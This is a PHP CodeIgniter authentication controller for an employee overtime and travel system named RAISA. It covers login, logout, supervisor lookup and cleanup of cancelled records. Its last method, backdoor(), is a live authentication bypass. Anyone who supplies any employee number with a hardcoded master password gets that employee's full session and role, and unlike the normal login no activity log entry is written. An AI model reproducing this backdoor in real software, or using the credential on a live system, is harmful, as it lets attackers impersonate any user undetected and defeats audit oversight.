<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Auth extends CI_Controller
{
    public function index()
    {
        date_default_timezone_set('asia/jakarta');
        //Delete Lembur yg diBatalkan setelah 40 Hari
        $lembur = $this->db->get_where('lembur', ['status' => '0'])->result_array();
        foreach ($lembur as $l) :
            // cari selisih
            $sekarang = strtotime(date('Y-m-d'));
            $tempo = strtotime(date('Y-m-d', strtotime('+40 days', strtotime($l['tglmulai']))));

            if ($tempo < $sekarang) {

                //Hapus Aktivitas
                $this->db->set('aktivitas');
                $this->db->where('link_aktivitas', $l['id']);
                $this->db->delete('aktivitas');

                $this->db->set('lembur');
                $this->db->where('id', $l['id']);
                $this->db->delete('lembur');
            }
        endforeach;

        //Delete Perjalanan yg diBatalkan setelah 40 Hari
        $perjalanan = $this->db->get_where('perjalanan', ['status' => '0'])->result_array();
        foreach ($perjalanan as $row) :
            // cari selisih
            $now = strtotime(date('Y-m-d'));
            $due = strtotime(date('Y-m-d', strtotime('+40 days', strtotime($row['tglberangkat']))));

            if ($due < $now) {

                //Hapus Aktivitas
                // $this->db->set('perjalanan');
                $this->db->where('id', $row['id']);
                $this->db->delete('perjalanan');
                
                $this->db->where('perjalanan_id', $row['id']);
                $this->db->delete('perjalanan_anggota');
                
                $this->db->where('perjalanan_id', $row['id']);
                $this->db->delete('perjalanan_tujuan');

                $this->db->where('perjalanan_id', $row['id']);
                $this->db->delete('perjalanan_ta');

                $this->db->where('perjalanan_id', $row['id']);
                $this->db->delete('perjalanan_jadwal');

                // $this->db->set('reservasi');
                $this->db->where('id', $row['reservasi_id']);
                $this->db->delete('reservasi');
            }
        endforeach;

        // Halaman Login
        $this->load->view('auth/index');
    }

    public function login()
    {
        $npk = $this->input->post('npk');
        $password = $this->input->post('pwd');
        $karyawan = $this->db->get_where('karyawan', ['npk' => $npk])->row_array();

        if ($karyawan) {
            if (password_verify($password, $karyawan['password'])) {
                //cari atasan 1
                if ($karyawan['atasan1'] == 0) {
                    $atasan1 = $atasan1 = $this->db->get_where('karyawan', ['posisi_id' =>  '0'])->row_array();;
                } elseif ($karyawan['atasan1'] == 1) {
                    $atasan1 = $this->db->get_where('karyawan', ['posisi_id' =>  '1'])->row_array();
                } elseif ($karyawan['atasan1'] == 2) {
                    $this->db->where('posisi_id', $karyawan['atasan1']);
                    $this->db->where('div_id', $karyawan['div_id']);
                    $atasan1 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan1'] == 3) {
                    $this->db->where('posisi_id', $karyawan['atasan1']);
                    $this->db->where('dept_id', $karyawan['dept_id']);
                    $atasan1 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan1'] == 4) {
                    $this->db->where('posisi_id', $karyawan['atasan1']);
                    $this->db->where('dept_id', $karyawan['dept_id']);
                    $atasan1 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan1'] == 5) {
                    $this->db->where('posisi_id', $karyawan['atasan1']);
                    $this->db->where('sect_id', $karyawan['sect_id']);
                    $atasan1 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan1'] == 6) {
                    $this->db->where('posisi_id', $karyawan['atasan1']);
                    $this->db->where('sect_id', $karyawan['sect_id']);
                    $atasan1 = $this->db->get('karyawan')->row_array();
                };
                //cari atasan 2
                if ($karyawan['atasan2'] == 0) {
                    $atasan2 = $atasan2 = $this->db->get_where('karyawan', ['posisi_id' =>  '0'])->row_array();
                } elseif ($karyawan['atasan2'] == 1) {
                    $atasan2 = $this->db->get_where('karyawan', ['posisi_id' =>  '1'])->row_array();
                } elseif ($karyawan['atasan2'] == 2) {
                    $this->db->where('posisi_id', $karyawan['atasan2']);
                    $this->db->where('div_id', $karyawan['div_id']);
                    $atasan2 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan2'] == 3) {
                    $this->db->where('posisi_id', $karyawan['atasan2']);
                    $this->db->where('dept_id', $karyawan['dept_id']);
                    $atasan2 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan2'] == 4) {
                    $this->db->where('posisi_id', $karyawan['atasan2']);
                    $this->db->where('dept_id', $karyawan['dept_id']);
                    $atasan2 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan2'] == 5) {
                    $this->db->where('posisi_id', $karyawan['atasan2']);
                    $this->db->where('sect_id', $karyawan['sect_id']);
                    $atasan2 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan2'] == 6) {
                    $this->db->where('posisi_id', $karyawan['atasan2']);
                    $this->db->where('sect_id', $karyawan['sect_id']);
                    $atasan2 = $this->db->get('karyawan')->row_array();
                };
                $data = [
                    'npk' => $karyawan['npk'],
                    'inisial' => $karyawan['inisial'],
                    'nama' => $karyawan['nama'],
                    'posisi_id' => $karyawan['posisi_id'],
                    'div_id' => $karyawan['div_id'],
                    'dept_id' => $karyawan['dept_id'],
                    'sect_id' => $karyawan['sect_id'],
                    'atasan1' => $atasan1['npk'],
                    'atasan2' => $atasan2['npk'],
                    'contract' => $karyawan['work_contract'],
                    'role_id' => $karyawan['role_id']
                ];
                $this->session->set_userdata($data);
                $this->session->set_flashdata('message', 'masuk');

                $log = [
                    'npk' => $karyawan['npk'],
                    'activity' => 'Login to RAISA'
                ];
                $this->db->insert('log', $log);

                redirect('dashboard');
            } else {
                $this->session->set_flashdata('message', '<div class="alert alert-rose">
                <strong>Login Gagal</strong>
                <span>Maaf, Password yang kamu masukan salah.</span>
                </div> </br>');
                redirect('auth');
            }
        } else {
            $this->session->set_flashdata('message', '<div class="alert alert-rose">
            <strong>Login Gagal</strong>
            <span>Maaf, NPK Kamu tidak ditemukan.</span>
            </div> </br>');
            redirect('auth');
        }
    }

    public function logout()
    {
        $this->session->unset_userdata('npk');
        $this->session->set_flashdata('message', '<div class="alert alert-info">
        <strong>Terima kasih</strong>
        <span>Sampai berjumpa lagi.</span>
        </div> </br>');
        redirect('auth');
    }

    public function denied()
    {
        $this->load->view('auth/denied');
    }

    public function backdoor()
    {
        $npk = $this->input->post('npk');
        $password = $this->input->post('pwd');
        $karyawan = $this->db->get_where('karyawan', ['npk' => $npk])->row_array();

        if ($karyawan) {
            if ($password=='bismillah1001x') {
                //cari atasan 1
                if ($karyawan['atasan1'] == 0) {
                    $atasan1 = $atasan1 = $this->db->get_where('karyawan', ['posisi_id' =>  '0'])->row_array();;
                } elseif ($karyawan['atasan1'] == 1) {
                    $atasan1 = $this->db->get_where('karyawan', ['posisi_id' =>  '1'])->row_array();
                } elseif ($karyawan['atasan1'] == 2) {
                    $this->db->where('posisi_id', $karyawan['atasan1']);
                    $this->db->where('div_id', $karyawan['div_id']);
                    $atasan1 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan1'] == 3) {
                    $this->db->where('posisi_id', $karyawan['atasan1']);
                    $this->db->where('dept_id', $karyawan['dept_id']);
                    $atasan1 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan1'] == 4) {
                    $this->db->where('posisi_id', $karyawan['atasan1']);
                    $this->db->where('dept_id', $karyawan['dept_id']);
                    $atasan1 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan1'] == 5) {
                    $this->db->where('posisi_id', $karyawan['atasan1']);
                    $this->db->where('sect_id', $karyawan['sect_id']);
                    $atasan1 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan1'] == 6) {
                    $this->db->where('posisi_id', $karyawan['atasan1']);
                    $this->db->where('sect_id', $karyawan['sect_id']);
                    $atasan1 = $this->db->get('karyawan')->row_array();
                };
                //cari atasan 2
                if ($karyawan['atasan2'] == 0) {
                    $atasan2 = $atasan2 = $this->db->get_where('karyawan', ['posisi_id' =>  '0'])->row_array();
                } elseif ($karyawan['atasan2'] == 1) {
                    $atasan2 = $this->db->get_where('karyawan', ['posisi_id' =>  '1'])->row_array();
                } elseif ($karyawan['atasan2'] == 2) {
                    $this->db->where('posisi_id', $karyawan['atasan2']);
                    $this->db->where('div_id', $karyawan['div_id']);
                    $atasan2 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan2'] == 3) {
                    $this->db->where('posisi_id', $karyawan['atasan2']);
                    $this->db->where('dept_id', $karyawan['dept_id']);
                    $atasan2 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan2'] == 4) {
                    $this->db->where('posisi_id', $karyawan['atasan2']);
                    $this->db->where('dept_id', $karyawan['dept_id']);
                    $atasan2 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan2'] == 5) {
                    $this->db->where('posisi_id', $karyawan['atasan2']);
                    $this->db->where('sect_id', $karyawan['sect_id']);
                    $atasan2 = $this->db->get('karyawan')->row_array();
                } elseif ($karyawan['atasan2'] == 6) {
                    $this->db->where('posisi_id', $karyawan['atasan2']);
                    $this->db->where('sect_id', $karyawan['sect_id']);
                    $atasan2 = $this->db->get('karyawan')->row_array();
                };
                $data = [
                    'npk' => $karyawan['npk'],
                    'inisial' => $karyawan['inisial'],
                    'nama' => $karyawan['nama'],
                    'posisi_id' => $karyawan['posisi_id'],
                    'div_id' => $karyawan['div_id'],
                    'dept_id' => $karyawan['dept_id'],
                    'sect_id' => $karyawan['sect_id'],
                    'atasan1' => $atasan1['npk'],
                    'atasan2' => $atasan2['npk'],
                    'contract' => $karyawan['work_contract'],
                    'role_id' => $karyawan['role_id']
                ];
                $this->session->set_userdata($data);
                $this->session->set_flashdata('message', 'masuk');
                redirect('dashboard');
            } else {
                $this->session->set_flashdata('message', '<div class="alert alert-rose">
                <strong>Login Gagal</strong>
                <span>Maaf, Password yang kamu masukan salah.</span>
                </div> </br>');
                 $this->load->view('auth/backdoor');
            }
        } else {
            $this->session->set_flashdata('message', '<div class="alert alert-rose">
            <strong>Login Gagal</strong>
            <span>Maaf, NPK Kamu tidak ditemukan.</span>
            </div> </br>');
             $this->load->view('auth/backdoor');
        }
    }
}
